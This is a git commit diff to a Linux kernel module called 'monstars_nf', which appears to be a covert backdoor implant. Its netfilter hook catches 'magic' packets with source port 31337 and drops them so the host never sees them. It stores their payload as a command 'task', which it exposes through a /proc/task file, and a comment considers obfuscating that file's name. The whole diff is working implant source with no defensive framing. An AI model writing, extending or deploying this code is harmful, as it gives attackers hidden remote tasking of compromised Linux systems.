a5b0cb883a0dd865d556087f5812ca9f579c5154
J-Spade <j_spade@verizon.net>
2022-12-24 12:33:49 -0500

    write commands to /proc/task

--- kernel/macros.h
+++ kernel/macros.h
@@ -1,10 +1,15 @@
 
+#include <linux/kernel.h>
+#include <linux/stat.h>
+
 #ifdef DEBUG
-    #include <linux/kernel.h>
     #define KERNEL_LOG(...) printk(KERN_DEBUG __VA_ARGS__)
 #else
     #define KERNEL_LOG(...)
 #endif
 
-// magic numbers for netfilter listener
-#define MAGIC_SRC_PORT 31337
+#define MAGIC_SRC_PORT 31337  // magic numbers for netfilter listener
+#define MAX_DATA_SIZE 64000  // a bit smaller than the maximum TCP/UDP payload sizes
+
+#define PROCFS_FILENAME "task"  // TODO: obfuscate?
+#define PROCFS_PERMISSIONS (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)
--- kernel/monstars_nf.c
+++ kernel/monstars_nf.c
@@ -1,11 +1,15 @@
-#include <linux/module.h>
+
+#include <linux/ip.h>
 #include <linux/kernel.h>
-#include <linux/version.h>
+#include <linux/module.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
-#include <linux/ip.h>
+#include <linux/proc_fs.h>
+#include <linux/string.h>
 #include <linux/tcp.h>
 #include <linux/udp.h>
+#include <linux/version.h>
+
 #include <stddef.h>
 
 #include "macros.h"
@@ -15,8 +19,47 @@ MODULE_DESCRIPTION("nothin but net");
 MODULE_LICENSE("GPL");
 
 static struct nf_hook_ops s_hookops;
+static struct proc_dir_entry* s_procfile;
+static struct proc_ops s_procfileops;
 
-unsigned int hook_func(void *priv, struct sk_buff *sockbuf, const struct nf_hook_state *state)
+static bool s_task_pending;
+static char s_current_task[MAX_DATA_SIZE];
+
+// Procfile READ callback - reports the stored task to userland
+ssize_t read_callback(struct file* filep, char __user* buf, size_t count, loff_t* ppos)
+{
+    ssize_t retval = 0;
+    size_t len = strnlen(s_current_task, MAX_DATA_SIZE);
+    KERNEL_LOG("MONSTARS_NF : file READ (size %lu, off %lld)\n", count, *ppos);
+
+    // Simplification: dump the whole task at once, always.
+    if ((0 == *ppos) && (s_task_pending) && (count > len))
+    {
+        if (copy_to_user(buf, s_current_task, len))
+        {
+            retval = -EFAULT;
+        }
+        else
+        {
+            retval = len;
+            *ppos = len;
+            memset(s_current_task, 0, MAX_DATA_SIZE);
+            s_task_pending = false;
+        }
+    }
+    return retval;
+}
+
+// Procfile WRITE callback - not supported
+ssize_t write_callback(struct file* filep, const char __user* buf, size_t count, loff_t* ppos)
+{
+    KERNEL_LOG("MONSTARS_NF : file WRITE \n");
+    return (ssize_t)-1;
+}
+
+
+// The netfilter callback - checks for magic packets
+unsigned int nf_callback(void* priv, struct sk_buff* sockbuf, const struct nf_hook_state* state)
 {
     unsigned int retval = NF_ACCEPT;
     struct iphdr *iph = NULL;
@@ -64,8 +107,10 @@ unsigned int hook_func(void *priv, struct sk_buff *sockbuf, const struct nf_hook
                 if (NULL != data)
                 {
                     KERNEL_LOG("MONSTARS_NF : Received:  %s\n", data);
+                    // TODO: this overwrites any pending task-- do we want this?
+                    strncpy(s_current_task, data, MAX_DATA_SIZE);
+                    s_task_pending = true;
                 }
-                // TODO: handle commands
                 retval =  NF_DROP;
             }
         }
@@ -73,10 +118,15 @@ unsigned int hook_func(void *priv, struct sk_buff *sockbuf, const struct nf_hook
     return retval;
 }
 
+// Setup
 int init_module()
 {
     int retval = 0;
-    s_hookops.hook      = (nf_hookfn *) hook_func;
+
+    s_task_pending = false;
+
+    // Declare and initialize netfilter hook
+    s_hookops.hook      = (nf_hookfn *) nf_callback;
     s_hookops.hooknum   = NF_INET_PRE_ROUTING;
     s_hookops.pf        = PF_INET;
     s_hookops.priority  = NF_IP_PRI_FIRST;
@@ -90,21 +140,37 @@ int init_module()
         KERNEL_LOG("MONSTARS_NF : Error registering hook!\n");
         retval = 1;
     }
-#ifdef DEBUG
-    else
+
+    // Declare and initialize /proc file hook
+    s_procfileops.proc_read = read_callback;
+    s_procfileops.proc_write = write_callback;
+    
+    s_procfile = proc_create(PROCFS_FILENAME, PROCFS_PERMISSIONS, NULL, &s_procfileops);
+    if (NULL == s_procfile)
     {
-        KERNEL_LOG("MONSTARS_NF : Module charged.\n");
+        KERNEL_LOG("MONSTARS_NF : Error creating /proc file!\n");
+        retval = 1;
     }
-#endif
+    
+    KERNEL_LOG("MONSTARS_NF : Module init returned %d\n", retval);
     return retval;
 }
 
+// Cleanup
 void cleanup_module()
 {
+    // Unregister netfilter hook
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
     nf_unregister_net_hook(&init_net, &s_hookops);
 #else
     nf_unregister_hook(&s_hookops);
 #endif
+
+    // Remove /proc file
+    if (NULL != s_procfile)
+    {
+        proc_remove(s_procfile);
+    }
+
     KERNEL_LOG("MONSTARS_NF : Module decharged.\n");
 }
